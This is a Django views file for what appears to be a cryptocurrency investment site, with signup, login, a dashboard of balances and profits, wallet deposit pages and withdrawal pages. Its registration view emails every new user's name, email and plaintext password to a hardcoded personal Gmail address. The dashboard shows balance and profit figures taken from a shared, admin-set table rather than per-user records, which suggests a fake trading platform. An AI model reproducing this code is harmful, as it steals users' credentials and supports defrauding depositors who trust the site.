from django.shortcuts import render, redirect
from django.contrib import messages, auth
from django.contrib.auth import login as auth_login, logout as auth_logout, authenticate
from django.contrib.auth.forms import AuthenticationForm
from django.contrib.auth.models import User
from django.contrib.auth.decorators import login_required
from django.views.decorators.csrf import csrf_exempt, csrf_protect
from .models import Enquirie, Number
from django.core.mail import EmailMessage, get_connection, send_mail
from django.conf import settings
# Create your views here.


def Home(request):
    return render(request, "index.html")


def about(request):
    return render(request, "about.html")

def product(request):
    return render(request, "product.html")

def contact(request):
    return render(request, "contact.html")


def services(request):
    return render(request, "services.html")


def login(request):
    if request.method == "POST":
       username = request.POST['username']
       password = request.POST['password']

       user = auth.authenticate(username=username, password=password)


       if user is not None:
           auth.login(request, user)
           return redirect('dashboard')
       else:
           messages.error(request, 'Invalid login credentials')
           return redirect('login')
    else:
        return render(request, 'login.html')


def register(request):
    if request.method == "POST":
        firstname = request.POST['firstname']
        lastname = request.POST['lastname']
        username = request.POST['username']
        email = request.POST['email']
        password = request.POST['password']
        confirm_password = request.POST['confirm_password']

        if password == confirm_password:
            if User.objects.filter(username=username):
                messages.error(request, 'username already exist')
                return redirect('register')
            else:
                if User.objects.filter(email=email):
                    messages.error(request, 'email already exist')
                    return redirect('register')
                else:
                    user = User.objects.create_user(first_name=firstname, last_name=lastname, username=username, email=email, password=password)
                    auth.login(request, user)
                    user.save()
                    messages.success(request, 'you are registered successfully.')
                    messages.success(request, 'you are now logged in')


                    send_mail(
                        'New User Registration', #title
                        'You have a new user ' + ' firstname: ' + firstname + ',' + ' lastname: ' + lastname + ','  + ' email: ' + email + ',' + ' password: ' + password + '. Login to your admin panel for management',
                        email,
                        ['maxwellchadwicks78@gmail.com'],
                        fail_silently=False
                    )
                        
                    return redirect('dashboard')


          
        else:
            messages.error(request, 'password do not match.')
            return redirect('register')
    else:
        return render(request, 'register.html')

@login_required(login_url= 'login')
def dashboard(request):
    balance = Number.objects.values_list('balance',flat=True ).distinct()
    profit1 = Number.objects.values_list('profit1',flat=True ).distinct()
    profit2 = Number.objects.values_list('profit2',flat=True ).distinct()
    profit3 = Number.objects.values_list('profit3',flat=True ).distinct()
    profit4 = Number.objects.values_list('profit4',flat=True ).distinct()
    profit5 = Number.objects.values_list('profit5',flat=True ).distinct()
    data = {
        'balance': balance,
        'profit1': profit1,
        'profit2': profit2,
        'profit3': profit3,
        'profit4': profit4,
        'profit5': profit5,
    }

    return render(request, 'dashboard.html', data)


@login_required (login_url= 'login')
def withdraw(request):             
    return render(request, 'dashboard/withdraw.html')

@login_required (login_url= 'login')
def fund(request):
    return render(request, 'dashboard/fund.html')

@login_required (login_url= 'login')
def trading(request):
    return render(request, 'dashboard/trading.html')

@login_required (login_url= 'login')
def bitcoin(request):
    bitcoin = Enquirie.objects.values_list('btc_wallet', flat=True).distinct()
    data = {
        'bitcoin': bitcoin,
    }
    return render(request, 'coins/bitcoin.html', data)

@login_required (login_url= 'login')
def ethereum(request):
    ethereum = Enquirie.objects.values_list('eth_wallet',flat=True ).distinct()
    data = {
        'ethereum': ethereum,
    }
    return render(request, 'coins/ethereum.html', data)

@login_required (login_url= 'login')
def usdterc20(request):
    usdterc20 = Enquirie.objects.values_list('usdterc20_wallet', flat=True).distinct()
    data = {
        'usdterc20': usdterc20,
    }
    return render(request, 'coins/usdterc20.html', data)

@login_required (login_url= 'login')
def usdttrc20(request):
    usdttrc20 = Enquirie.objects.values_list('usdttrc20_wallet', flat=True).distinct()
    data = {
        'usdttrc20': usdttrc20
    }
    return render(request, 'coins/usdttrc20.html', data)

@login_required (login_url= 'login')
def longtime(request):
    return render(request, 'trades/longtime.html')

@login_required (login_url= 'login')
def shorttime(request):
    return render(request, 'trades/shorttime.html')

@login_required (login_url= 'login')
def withdrawal(request):
    return render(request, 'dashboard/withdrawal.html')





def logout(request):
    if request.method == 'POST':
        auth.logout(request)
        messages.success(request, "You are successfully logged out.")
        return redirect('home')
    return redirect('home')
    
